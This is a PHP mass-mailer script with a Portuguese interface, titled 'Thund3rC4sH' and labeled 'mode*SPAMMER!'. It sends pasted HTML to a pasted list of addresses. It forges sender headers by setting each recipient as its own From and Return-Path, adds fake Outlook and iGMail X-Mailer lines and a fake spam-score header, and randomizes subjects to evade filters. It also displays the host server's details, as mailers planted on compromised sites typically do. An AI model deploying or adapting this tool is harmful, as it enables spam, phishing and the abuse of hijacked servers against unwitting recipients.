<?php
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	//$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$email = explode("\n", $to);
	$message = stripslashes($message);
	
	$i = 0;
	$count = 1;
	while($email[$i]) {
		$ok = "ok";
		$gera = rand(1,100000);
		$headers  = "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";
		$headers .= "Content-Transfer-encoding: 8bit\n";
		$headers .= "From: ".$email[$i]."\n";
		$headers .= "Reply-To: $email[$i]\n";
		$headers .= "Return-Path: $email[$i]\n";
		$headers .= "X-Mailer: iGMail [www.ig.com.br]\n";
		$headers .= "X-Originating-Email: $email[$i]\n";
		$headers .= "X-Sender: $email[$i]\n";
		$headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\r\n";
		if(mail($email[$i], $subject." (".$gera.")", $message, $headers))
		echo "<font color=gren>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=LightSeaGreen>ENVIADO....!</font><br><hr>";
		else
		echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>
<html>
<head>
<title>~ Thund3rC4sH |</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css">
<!--
body,table { font-family:"Lucida Console", Monaco, monospace;font-size:11px;color:white;background-color:black; }
table { width:100%; }
table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }
a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#99CCFF; }
input,select,option { font:8pt "Lucida Console", Monaco, monospace;color:#FFFFFF;margin:2;border:1px solid #666666; }
textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:10pt "Lucida Console", Monaco, monospace;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt "Lucida Console", Monaco, monospace;}
#pagebar a { font-weight:bold;color:#00FF00; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #1F1F1F; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #000000; }
input[type="text"] { padding:3px;}
.shell { background-color:#C0C0C0;color:#000080;padding:5px; }
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:#4A4A4A; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:#333333; }
textarea,.mainpanel input,select,option { background-color:#000000; }
// -->
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">

    <tr>

 
<table border="0" width="52%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px ridge #1BF51F" bgcolor="black" > 
     <td width="322" height="25" align="center" bgcolor="#000000"><span class="titulo">~ Thund3rC4sH |</span></td>
<tr align="left"> 
<td colspan="2" ><font color="#1BF51F">
Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Software usado: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
</td>

<td width="10"></center>


    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#000000">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" value=""class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">_ Thund3rC4sH _ - mode*SPAMMER!</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html"></textarea>
              <span class="alerta">*Lembrete: texto em HTML</span></td>
         </tr>
          <tr align="center" bgcolor="#000000">
            <td height="10" colspan="2"><span class="texto">Lista de emails</span>
             
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails"></textarea>
              <span class="alerta">*- Silêncio não e covardia, e sabedoria de quem aprendeu a confiar em [ DEUS ]</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" id="enviar" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>
    </tr>
  </table>
</form>
</body>